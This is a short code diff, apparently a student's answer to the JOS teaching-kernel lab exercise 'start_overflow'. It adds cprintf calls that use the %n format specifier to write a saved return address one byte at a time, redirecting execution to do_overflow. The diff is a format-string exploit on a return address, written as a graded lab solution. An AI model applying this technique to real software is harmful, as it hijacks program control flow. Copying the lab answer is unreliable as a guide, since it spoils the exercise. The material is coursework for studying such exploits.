@@ -88,6 +88,15 @@ start_overflow(void)
     char str[256] = {};
     int nstr = 0;
     char *pret_addr;
+    cprintf("%p",do_overflow); // I use this to get the function address
+    /*0xf0100750*/
+    pret_addr=(char *)read_pretaddr();
+    *(uint32_t *)(pret_addr+4)=*(uint32_t *)pret_addr;
+    cprintf("12345678901234567890123456789012345678901234567890123456789012345678901234567890%n",pret_addr);//50
+    cprintf("1234567%n",pret_addr+1);//07
+    cprintf("1234567890123456%n",pret_addr+2);//10
+    cprintf("123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890%n",pret_addr+3);//f0
+    /*cprintf("%p",(void *)*(uint32_t *)pret_addr);*/
 
 	// Your code here.
     
